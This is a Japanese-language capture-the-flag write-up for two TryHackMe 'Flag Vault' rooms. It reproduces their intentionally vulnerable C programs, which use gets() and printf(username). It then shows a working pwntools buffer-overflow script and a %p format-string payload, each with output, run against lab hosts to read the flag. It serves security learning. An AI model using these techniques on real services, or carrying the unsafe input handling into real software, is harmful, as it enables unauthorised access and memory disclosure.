# Flag Vault 1, 2 CTF

https://tryhackme.com/room/hfb1flagvault

https://tryhackme.com/room/hfb1flagvault2

## Flag Vault 1

### 静的解析

```c
#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 1.0 - Passwordless authentication evolved!\n"
		"==================================================================\n\n"
	      );
}

void print_flag(){
	FILE *f = fopen("flag.txt","r");
	char flag[200];

	fgets(flag, 199, f);
	printf("%s", flag);
}

void login(){
	char password[100] = "";
	char username[100] = "";

	printf("Username: ");
	gets(username);

	// If I disable the password, nobody will get in.
	//printf("Password: ");
	//gets(password);

	if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
		print_flag();
	}
	else{
		printf("Wrong password! No flag for you.");
	}
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```

- 連続２００バイトのバッファ
- bytereaper + NULL + 89chars + 5up3rP4zz123Byte + NULL で行けるはず。

### エクスプロイト

静的解析で考えたオフセットでは成功せず、2バイトずつずらしていったら、username と password のアドレスが112バイト差のところで成功した。  
ローカルで類似のCコードをコンパイルして解析したところ、112バイトと108バイトの配列が作られていると思われる。

```python
from pwn import *

connect = remote('10.10.201.239', 1337)

connect.recvuntil(b'Username: ')

payload = b'bytereaper'
payload += b'\x00'
payload += b'a' * (89 + 12)
payload += b'5up3rP4zz123Byte'

connect.sendline(payload)

print(connect.recvline())
```

```sh
$ python ./poc.py
[+] Opening connection to 10.10.201.239 on port 1337: Done
b'THM{......................}\n'
[*] Closed connection to 10.10.201.239 port 1337
```


## Flag Vault 2

```c
#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!\n"
		"==================================================================\n\n"
	      );
}

void print_flag(char *username){
        FILE *f = fopen("flag.txt","r");
        char flag[200];

        fgets(flag, 199, f);
        //printf("%s", flag);
	
	//The user needs to be mocked for thinking they could retrieve the flag
	printf("Hello, ");
	printf(username);
	printf(". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\n\n");
	printf("Yours truly,\nByteReaper\n\n");
}

void login(){
	char username[100] = "";

	printf("Username: ");
	gets(username);

	// The flag isn't printed anymore. No need for authentication
	print_flag(username);
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```

- login()でバッファオーバーフローしても、目的のバッファとは逆報告なので意味がない。
- 文字列フォーマット脆弱性を使えば、おそらくflagバッファの文字列が出てくるはず。

### エクスプロイト

```sh
$ python -c "print(' | '.join(['%d:%%p' % i for i in range(1,20)]))"
1:%p | 2:%p | 3:%p | 4:%p | 5:%p | 6:%p | 7:%p | 8:%p | 9:%p | 10:%p | 11:%p | 12:%p | 13:%p | 14:%p | 15:%p | 16:%p | 17:%p | 18:%p | 19:%p
```

```sh
$ nc 10.10.237.175 1337 
  ______ _          __      __         _ _   
 |  ____| |         \ \    / /        | | |  
 | |__  | | __ _  __ \ \  / /_ _ _   _| | |_ 
 |  __| | |/ _` |/ _` \ \/ / _` | | | | | __|
 | |    | | (_| | (_| |\  / (_| | |_| | | |_ 
 |_|    |_|\__,_|\__, | \/ \__,_|\__,_|_|\__|
                  __/ |                      
                 |___/                       
                                             
Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!
==================================================================

Username: 1:%p | 2:%p | 3:%p | 4:%p | 5:%p | 6:%p | 7:%p | 8:%p | 9:%p | 10:%p | 11:%p | 12:%p | 13:%p | 14:%p | 15:%p | 16:%p | 17:%p | 18:%p | 19:%p
Hello, 1:0x7ffe45ec5440 | 2:(nil) | 3:0x7f59a6949887 | 4:0x7 | 5:0x55c820897480 | 6:0x7ffe45ec77f8 | 7:0x7ffe45ec7660 | 8:0x7f59a6a4c600 | 9:0x55c8208972a0 | 10:0x[REDACTED] | 11:0x[REDACTED] | 12:0x[REDACTED] | 13:0x7f59a68c2d96 | 14:0x7f59a6a4ba00 | 15:(nil) | 16:0xa | 17:0x7f59a68b541c | 18:0x234 | 19:0x7ffe45ec7661. Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...

Yours truly,
ByteReaper
```

10, 11, 12 番目をASCII文字列として解釈できた。

## 振り返り

- どちらも基本だが、配列サイズがアラインメント調整されていた点で少し苦労した。
